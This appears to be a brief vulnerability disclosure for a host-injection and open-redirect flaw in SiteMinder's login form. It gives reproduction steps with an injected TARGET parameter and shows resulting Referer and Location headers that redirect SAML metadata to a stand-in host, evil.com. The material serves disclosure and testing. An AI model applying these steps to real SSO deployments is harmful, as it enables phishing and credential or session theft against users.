# Host-Manipulation-Siteminder

#Overview of the Vulnerability
This vulnerability is capable of injecting contents into the login form in a hidden way (<input type='hidden'), it also adds two reference fields capable of redirecting when performing a successful login.

                                                                                                
# Step to reproduce:
1) On url, change a fields /siteminderagent/forms/login.fcc?TYPE=&REALMOID=&GUID=&SMAUTHREASON=0&METHOD=GET&SMAGENTNAME=&TARGET=-SM- {INJECT DOMAIN}
2) After adding a domain to your request, a new form of hidden type will be created automatically (<input type='hidden') and the following parameters will also be added to the request header:

"Referer: https:// {URL INJECT HERE} /affwebservices/secure/secureredirect/?SPID=https://evil.com/c2c/saml/metadata&SMPORTALURL=v%2FJaQcXcjv8i0itl6jA1r2S8TfHqIfZQoDq7oEUdb5QFATBYY04pvqJppw%2Bhp0fYSZ JogkCgh4WtuU4h7K%2BqsRXj1fSiLP1hcEFrVyXJ68piomV2582unvZkwlhmdLov&SAMLTRANSACTIONID=925291bf-e9f8e8a5-e00625ea-bb9766fe-40f1431d-dd"

"Location: https:// {URL INJECT HERE} /affwebservices/secure/secureredirect/?SPID=https://evil.com/c2c/saml/metadata&SMPORTALURL=v%2FJaQcXcjv8i0itl6jA1r2S8TfHqIfZQoDq7oEUdb5QFATBYY04pvqJppw%2Bhp0fYSZJo gkCgh4WtuU4h7K%2BqsRXj1fSiLP1hcEFrVyXJ68piomV2582unvZkwlhmdLov&SAMLTRANSACTIONID=769a0761-7f79e2f5-35c4ace4-b9cccadc-f6d42b71-f"



# Google Hacking

First Redirect (Secure Redirect)
<img src="https://prnt.sc/NVJr3C5AvEE2">

Second Redirect (After Inject)
https://prnt.sc/9iXHGcXpVFI2
